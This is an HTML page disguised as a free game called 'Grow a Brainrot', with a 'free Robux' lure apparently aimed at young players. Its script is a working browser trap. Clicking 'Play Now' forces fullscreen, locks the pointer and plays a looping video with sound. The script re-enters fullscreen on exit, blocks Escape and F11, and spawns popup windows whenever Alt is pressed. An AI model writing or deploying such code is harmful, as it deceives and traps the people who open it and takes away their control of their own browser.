<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GROW A BRAINROT(NO TROJAN)</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            cursor: none; 
        }

        body {
            font-family: 'Comic Sans MS', 'Chalkboard SE', cursive;
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradient 10s ease infinite;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
            overflow: hidden;
        }

        .game-card {
            background: rgba(0, 0, 0, 0.9);
            border: 8px ridge #00ff00;
            border-radius: 20px;
            padding: 2.5rem;
            text-align: center;
            box-shadow: 0 0 50px #ff00ff, inset 0 0 20px #00ffff;
            max-width: 500px;
            width: 95%;
            z-index: 10;
        }

        .image-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 2rem;
            height: 300px;
        }

        .game-icon {
            max-width: 100%;
            max-height: 100%;
            border: 5px solid #fff;
            border-radius: 15px;
            object-fit: cover;
        }

        .play-button {
            background: #ff0000;
            color: white;
            padding: 20px 60px;
            font-size: 2rem;
            font-weight: 900;
            border: 4px solid #fff;
            border-radius: 10px;
            cursor: pointer;
            animation: vibrate 0.1s infinite;
        }

        #videoOverlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: black;
            z-index: 9999;
        }

        #myVideo {
            width: 100%;
            height: 100%;
            object-fit: fill; 
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        @keyframes vibrate {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            100% { transform: translate(0); }
        }
    </style>
</head>
<body>

    <div class="game-card" id="mainCard">
        <h1 style="font-size: 2.5rem; margin-bottom: 1.5rem; text-shadow: 4px 4px #f00;">GROW A BRAINROT</h1>
        <div class="image-container">
            <img src="https://i.imgur.com/Ohxn6Lc.jpeg" class="game-icon">
        </div>
        <button onclick="lockUser()" class="play-button">PLAY NOW</button>
        <p style="margin-top:20px; color: yellow;">FREE ROBUX INJECTING...</p>
    </div>

    <div id="videoOverlay">
        <video id="myVideo" loop playsinline>
            <source src="video.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        const overlay = document.getElementById('videoOverlay');
        const video = document.getElementById('myVideo');
        const card = document.getElementById('mainCard');

        function lockUser() {
            if (overlay.requestFullscreen) {
                overlay.requestFullscreen();
            } else if (overlay.webkitRequestFullscreen) {
                overlay.webkitRequestFullscreen();
            }

            overlay.requestPointerLock = overlay.requestPointerLock || overlay.webkitRequestPointerLock;
            overlay.requestPointerLock();

            card.style.display = 'none';
            overlay.style.display = 'block';
            video.muted = false;
            video.play();
        }

        // RE-LOCK ON EXIT
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement) {
                setTimeout(() => { lockUser(); }, 100);
            }
        });

        // ALT KEY TRAP
        window.addEventListener("keydown", (e) => {
            // Check if Alt key is pressed
            if (e.altKey || e.key === "Alt") {
                e.preventDefault();
                // Opens a new popup window with the same URL
                window.open(window.location.href, '_blank', 'width=800,height=600,menubar=no,status=no');
            }
            
            // Block Escape and F11
            if (e.key === "F11" || e.key === "Escape") {
                e.preventDefault();
            }
        });

        // Re-request pointer lock on click
        document.addEventListener('click', () => {
            if (overlay.style.display === 'block') {
                overlay.requestPointerLock();
            }
        });

    </script>
</body>
</html>
